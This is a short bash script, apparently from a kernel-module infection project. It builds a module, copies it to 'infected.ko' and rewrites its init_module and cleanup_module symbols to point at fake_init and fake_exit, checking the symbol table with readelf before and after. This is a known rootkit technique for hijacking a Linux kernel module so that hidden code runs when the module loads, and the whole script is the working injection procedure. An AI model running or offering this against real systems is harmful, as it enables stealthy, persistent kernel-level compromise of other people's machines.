#!/usr/bin/env bash


make &&
    cp noinj.ko infected.ko &&
    readelf -s infected.ko | grep -e init_module -e cleanup_module -e fake_init -e fake_exit&&
    setsym infected.ko init_module $(setsym infected.ko fake_init) &&
    setsym infected.ko cleanup_module $(setsym infected.ko fake_exit) &&
    readelf -s infected.ko | grep -e init_module -e cleanup_module -e fake_init -e fake_exit
